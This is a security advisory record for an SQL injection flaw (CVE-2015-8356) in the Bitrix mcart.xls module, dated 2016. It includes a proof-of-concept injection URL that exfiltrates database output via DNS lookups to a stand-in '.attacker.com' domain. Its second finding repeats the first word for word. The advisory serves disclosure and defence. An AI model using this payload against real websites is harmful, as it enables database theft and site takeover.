{
    "text": "title : Bitrix mcart.xls 6.5.2 SQL Injection  ， detail : Bitrix mcart.xls module versions 6.5.2 and below suffer from a remote SQL injection vulnerability.  ， cve : advisories | CVE-2015-8356  ，  ， desc : Advisory ID : HTB23279  ， Product : mcart.xls Bitrix module  ， Vendor : www.mcart.ru  ， Vulnerable Version ( s )  : 6.5.2 and probably prior  ， Tested Version : 6.5.2  ， Advisory Publication : November 18 , 2015 [ without technical details ]   ， Vendor Notification : November 18 , 2015  ， Public Disclosure : January 13 , 2016  ， Vulnerability Type : SQL Injection [ CWE-89 ]   ， CVE Reference : CVE-2015-8356  ， Risk Level : Medium  ， CVSSv3 Base Score : 6.3 [ CVSS : 3.0/AV : N/AC : L/PR : N/UI : R/S : U/C : L/I : L/A : L ]   ， Discovered and Provided : High-Tech Bridge Security Research Lab ( https : /www.htbridge.com/advisory/ )   ，  ， Advisory Details :   ， High-Tech Bridge Security Research Lab discovered multiple SQL Injection vulnerabilities in mcart.xls Bitrix module , which can be exploited to execute arbitrary SQL queries and obtain potentially sensitive data , modify information in database and gain complete control over the vulnerable website.  ， All discovered vulnerabilities require that the attacker is authorized against the website and has access to vulnerable module. However the vulnerabilities can be also exploited via CSRF vector , since the web application does not check origin of received requests. This means , that a remote anonymous attacker can create a page with CSRF exploit , trick victim to visit this page and execute arbitrary SQL queries in database of vulnerable website.  ， 1. Input passed via the \"xls_profile\" HTTP GET parameter to \"/bitrix/admin/mcart_xls_import.php\" script is not properly sanitised before being used in SQL query. A remote authenticated attacker can manipulate SQL queries by injecting arbitrary SQL code.  ， The PoC code below is based on DNS Exfiltration technique and may be used if the database of the vulnerable application is hosted on a Windows system. The PoC will send a DNS request demanding IP address for `version (  ) ` ( or any other sensitive output from the database ) subdomain of \".attacker.com\" ( a domain name , DNS server of which is controlled by the attacker )  :   ， http : / [ host ] /bitrix/admin/mcart_xls_import.php?del_prof_real=1&xls_profile=%27%20OR%201= ( select%20load_file ( CONCAT ( CHAR ( 92 )  , CHAR ( 92 )  ,  ( select%20version (  )  , CHAR ( 46 )  , CHAR ( 97 )  , CHAR ( 116 )  , CHAR ( 116 )  , CHAR ( 97 )  , CHAR ( 99 )  , CHAR ( 107 )  , CHAR ( 101 )  , CHAR ( 114 )  , CHAR ( 46 )  , CHAR ( 99 )  , CHAR ( 111 )  , CHAR ( 109 )  , CHAR ( 92 )  , CHAR ( 102 )  , CHAR ( 111 )  , CHAR ( 111 )  , CHAR ( 98 )  , CHAR ( 97 )  , CHAR ( 114 ) +-+  ， 2. Input passed via the \"xls_profile\" HTTP GET parameter to \"/bitrix/admin/mcart_xls_import.php\" script is not properly sanitised before being used in SQL query. A remote authenticated attacker can manipulate SQL queries by injecting arbitrary SQL code.",
    "time": "Jan 14, 2016"
}